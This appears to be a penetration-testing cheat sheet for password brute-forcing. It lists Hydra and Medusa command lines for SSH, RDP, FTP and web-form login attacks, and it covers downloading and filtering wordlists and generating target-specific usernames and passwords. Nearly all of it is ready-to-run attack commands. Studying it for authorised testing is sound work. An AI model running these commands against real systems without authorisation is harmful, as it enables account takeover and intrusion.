# Brute Force Commands Cheat Sheet

## Installation Commands

### Hydra Installation
```bash
sudo apt-get -y update
sudo apt-get -y install hydra
```

### Medusa Installation
```bash
sudo apt-get -y update
sudo apt-get -y install medusa
```

### CUPP Installation
```bash
sudo apt install cupp -y
```

### Username Anarchy Installation
```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```

## Hydra Commands

### Basic Hydra Syntax
```bash
hydra [login_options] [password_options] [attack_options] [service_options]
```

### HTTP Basic Authentication
```bash
hydra -l username -P passwords.txt target.com http-get
```

### SSH Brute Force
```bash
hydra -l root -P passwords.txt ssh://192.168.1.100
```

### Multiple SSH Targets
```bash
hydra -l root -p toor -M targets.txt ssh
```

### FTP with Custom Port
```bash
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

### Web Login Form (POST)
```bash
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

### Advanced RDP with Generated Passwords
```bash
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

### HTTP POST Form with Failure Condition
```bash
hydra -L usernames.txt -P passwords.txt -f IP -s PORT http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

## Medusa Commands

### Basic Medusa Syntax
```bash
medusa [target_options] [credential_options] -M module [module_options]
```

### SSH Brute Force
```bash
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
```

### Multiple Web Servers with Basic Auth
```bash
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```

### Test for Empty/Default Passwords
```bash
medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```

### SSH with Parallel Tasks
```bash
medusa -h IP -n PORT -u sshuser -P passwords.txt -M ssh -t 3
```

### FTP Brute Force
```bash
medusa -h 127.0.0.1 -u ftpuser -P passwords.txt -M ftp -t 5
```

## Wordlist and Filtering Commands

### Download Common Wordlists
```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
```

### Filter Passwords by Policy (Minimum Length)
```bash
grep -E '^.{8,}$' passwords.txt > filtered-minlength.txt
```

### Filter for Uppercase Letters
```bash
grep -E '[A-Z]' input.txt > output-uppercase.txt
```

### Filter for Lowercase Letters
```bash
grep -E '[a-z]' input.txt > output-lowercase.txt
```

### Filter for Numbers
```bash
grep -E '[0-9]' input.txt > output-numbers.txt
```

### Complex Policy Filter (6+ chars, upper, lower, number, 2+ special chars)
```bash
grep -E '^.{6,}$' passwords.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > filtered-passwords.txt
```

### Count Lines in File
```bash
wc -l filename.txt
```

## Custom Wordlist Generation

### Username Anarchy Usage
```bash
./username-anarchy -l  # List available plugins
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

### CUPP Interactive Mode
```bash
cupp -i
```

## Network Reconnaissance

### Check Listening Ports
```bash
netstat -tulpn | grep LISTEN
```

### Nmap Localhost Scan
```bash
nmap localhost
```

## Connection Commands

### SSH Connection
```bash
ssh username@IP -p PORT
```

### FTP Connection
```bash
ftp ftp://username:password@hostname
```

## File Operations in FTP
```bash
ftp> ls          # List files
ftp> get file.txt # Download file
ftp> exit        # Exit FTP session
```

## Key Parameters Reference

### Hydra Parameters
- `-l LOGIN` : Single username
- `-L FILE` : Username list file
- `-p PASS` : Single password
- `-P FILE` : Password list file
- `-t TASKS` : Number of parallel tasks
- `-f` : Stop after first success
- `-s PORT` : Custom port
- `-v` : Verbose output

### Medusa Parameters
- `-h HOST` : Single target
- `-H FILE` : Target list file
- `-u USERNAME` : Single username
- `-U FILE` : Username list file
- `-p PASSWORD` : Single password
- `-P FILE` : Password list file
- `-M MODULE` : Attack module
- `-t TASKS` : Parallel login attempts
- `-f` : Stop after first success per host
- `-F` : Stop after first success any host
